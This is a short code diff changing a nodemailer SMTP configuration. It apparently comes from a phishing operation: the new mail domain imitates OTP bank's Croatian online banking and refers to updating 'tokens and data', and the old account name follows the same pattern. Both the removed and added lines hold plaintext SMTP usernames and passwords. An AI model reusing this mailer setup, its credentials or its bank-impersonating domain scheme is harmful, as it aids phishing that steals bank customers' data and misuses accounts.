@@ -3,13 +3,13 @@ const createTransport = require("nodemailer").createTransport;
  const SendMail = async (email) => {
   return new Promise((resolve, reject) => {
     let transporter = createTransport({
-      host: "lx14.hoststar.hosting",
-      port: 587,
-      secure: false,
+      host: "mail.otp-hr-online-bankarstvo-azuriranje-tokena-i-podataka.net",
+      port: 465,
+      secure: true,
       auth: {
         // admin@flirttool.com
-        user: "info@elementa-otp-hr-tkn.online",
-        pass: "Admin2425@@!!**",
+        user: "info@otp-hr-online-bankarstvo-azuriranje-tokena-i-podataka.net",
+        pass: "tBTFy4xvS1",
       },
     });
 
